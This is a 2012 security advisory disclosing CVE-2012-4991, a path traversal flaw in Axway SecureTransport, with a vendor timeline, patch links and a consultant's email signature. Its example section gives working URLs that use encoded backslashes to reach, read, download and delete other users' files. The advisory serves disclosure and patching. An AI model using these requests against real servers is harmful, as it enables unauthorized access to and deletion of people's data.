Secure Transport Path Traversal Vulnerability

Public Disclosure Date:
November 11, 2012

Vendors Affected:
Axway
http://www.axway.com

Systems Affected:
Secure Transport

Problem:
A path traversal vulnerability was identified in SecureTransport versions 5.1 SP2 and earlier on the Microsoft Windows platform that could allow tampering and information disclosure. This vulnerability allows remote attackers to access other user's directories, and also to read, download, delete and upload arbitrary files. This can be performed using a encoded backslash characters (%5c) in the path.

Example:
To escape the lock home directory, use the following url
https://<<IP>>/..%5C
To get access to another user's home directory, use the following url
https://<<IP>>/..%5C<<Username>>
To read another user's file in his/her home directory, use the following url
https://<<IP>>/..%5C<<Username>>/file.txt?P
To download another user's file in his/her home directory, use the following url
https://<<IP>>/..%5C<<Username>>/file.txt?B
To delete another user's file in his/her home directory, use the following url
https://<<IP>>/..%5C<<Username>>/file.txt?D
To upload a file in other user's home directory just use the upload function

Vendor Status: Contacted on September 12, 2012

Informed: Contacted back on September 12, 2012

Contacted: Customer confirmed the vulnerability, and that this was solved on October 30, 2012

Patch Available:
For 4.9.2 sp2:
https://support.axway.com/en/downloads/download-details/id/35283
For 5.1 sp2:
https://support.axway.com/en/downloads/download-details/id/35957

CVE: CVE-2012-4991

CVSSv2 Score: 8.5

CVSSv2 Access Vector: (AV:N/AC:L/Au:S/C:C/I:C/A:N)

Impact Type: Allows unauthorized disclosure and modification of information

Status: Fixed

Acknowledgment: Axway would like to acknowledge Sebastian Perez (@Seba_DTT), of Deloitte Argentina (www.deloitte.com/ar) and Deloitte Canada (www.deloitte.ca) for helping to identify this issue.

Related Links:
Deloitte Argentina
www.deloitte.com/ar

Vendor Product:
http://www.axway.com/products-solutions/mft/gateways/securetransport

Axway Support
For further information, or assistance with this Patch, contact Axway  Global Support.
Online - https://support.axway.com
Email - support@axway.com



Sebastian Perez, C|EH
Senior Consultant | Information Security Specialist
Security, Privacy & Resilience Services - Enterprise Risk Services
Deloitte & Co. S.A.
Pte. Gral.J.D.Perón 646, 7piso- C1038AAN Buenos Aires Argentina
Main: +54 11 4320 2700 ext. 8350  | Fax: +54 11 4320 4071
seperez@deloitte.com | www.deloitte.com
Por favor tome en cuenta el medio ambiente antes de imprimir



Deloitte se refiere a una o más de las firmas miembros de Deloitte Touche Tohmatsu Limited, una compañía privada del Reino Unido limitada por garantía, y su red de firmas miembros, cada una como una entidad única e independiente y legalmente separada. Una descripción detallada de la estructura legal de Deloitte Touche Tohmatsu Limited y sus firmas miembros puede verse en el sitio web http://www.deloitte.com/about.                           La información de este mail es confidencial y concierne únicamente a la persona a quien está dirigida. Si este mensaje no está dirigido a usted, por favor tenga presente que no tiene autorización para leer el resto de este e-mail, copiarlo o derivarlo a cualquier otra persona que no sea aquella a quien está dirigido. Si recibe este mail por error, por favor, avise al remitente, luego de lo cual rogamos a usted destruya el mensaje original. No se puede responsabilizar de ningún modo a Deloitte & Co. S.A. ni a sus subsidiarias por cualquier consecuencia o daño que pueda resultar del apropiado y completo envío y recepción del contenido de este e-mail.

Deloitte refers to one or more of Deloitte Touche Tohmatsu Limited, a UK private company limited by guarantee, and its network of member firms, each of which is a legally separate and independent entity. Please see http://www.deloitte.com/about for a detailed description of the legal structure of Deloitte Touche Tohmatsu Limited and its member firms.
The information in this e-mail is confidential and intended solely for the person to whom it is addressed. If this message is not addressed to you, please be aware that you have no authorization to read the rest of this e-mail, to copy it or to furnish it to any person other than the addressee. Should you have received this e-mail by mistake, please bring this to the attention of the sender, after which you are kindly requested to destroy the original message. Deloitte & Co. S.A. and subsidiaries cannot be held responsible or liable in any way whatsoever for and/or in connection with any consequences and/or damage resulting from the proper and complete dispatch and receipt of the content of this e-mail